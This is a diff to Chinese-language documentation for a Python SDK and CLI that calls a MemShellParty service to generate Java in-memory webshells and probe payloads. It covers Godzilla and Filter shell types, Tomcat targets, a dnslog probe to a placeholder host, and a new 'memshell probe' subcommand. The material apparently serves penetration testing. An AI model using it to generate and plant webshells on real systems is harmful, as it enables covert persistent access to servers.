@@ -240,7 +240,7 @@ meta = extract_generate_meta(result)
 
 ## generate_probe：探测马
 
-`generate_probe` 调用 `POST /api/probe/generate`。默认对齐官方探测页：`method=ResponseBody`、`content=Command`、`shrink=True`、`static_initialize=True`、`seconds=5`、`server=Tomcat`。`jre` 换算与 `generate` 相同（默认 6；class ≥53 时自动 `byPassJavaModule=True`）。
+`generate_probe` 调用 `POST /api/probe/generate`。默认对齐官方探测页：`method=ResponseBody`、`content=Command`、`shrink=True`、`static_initialize=True`、`seconds=5`、`server=Tomcat`、`sleep_server=Tomcat`。`jre` 换算与 `generate` 相同（默认 6；class ≥53 时自动 `byPassJavaModule=True`）。
 
 `method` / `content` 在已知名称内不区分大小写。SDK **不校验**二者组合；非法组合由服务端报 `MemShellPartyError`。空的 `host` / `req_param_name` / `command_template` 不会写入 JSON。
 
@@ -262,10 +262,11 @@ with MemShellParty() as client:
 也可只组装请求体：
 
 ```python
-from wtfutil.memshellutil import build_probe_body
+from wtfutil.memshellutil import MemShellParty, build_probe_body
 
 req = build_probe_body(method="dnslog", content="server", host="x.example.test", jre=9)
-result = client.generate_probe(body=req)
+with MemShellParty() as client:
+    result = client.generate_probe(body=req)
 ```
 
 ---
@@ -389,10 +390,14 @@ except MemShellPartyError as e:
 memshell generate --help
 memshell generate -o payload.txt
 memshell generate --shell-tool Godzilla --shell-type Filter --jre 9 -o out.txt
+memshell probe -o payload.txt
+memshell probe -m ResponseBody -c Command -p DefaultBase64 -o payload.txt
 memshell config
 memshell packers
 memshell install-skill --project
 ```
+
+`memshell probe` 生成探测马（`POST /api/probe/generate`）。`generate --probe` 仍是内存马回显探测开关，不是同一条子命令。
 
 - **`-o PATH`**：文件只写 `packResult`；stdout 为 meta JSON。
 - **无 `-o`**：stdout 完整响应 JSON。
@@ -400,7 +405,7 @@ memshell install-skill --project
 - **`--server` / `--shell-tool` / `--shell-type`**：已知名称内不区分大小写。
 - 日常用 `--password` / `--key` 即可；专用 `*-pass` 与 `--target-jre-version` 仍可用但不在 `--help` 中展示。
 
-参数与上表 kwargs 对应，详见 `memshell generate --help`。
+参数与上表 kwargs 对应，详见 `memshell generate --help` / `memshell probe --help`。
 
 ---
 
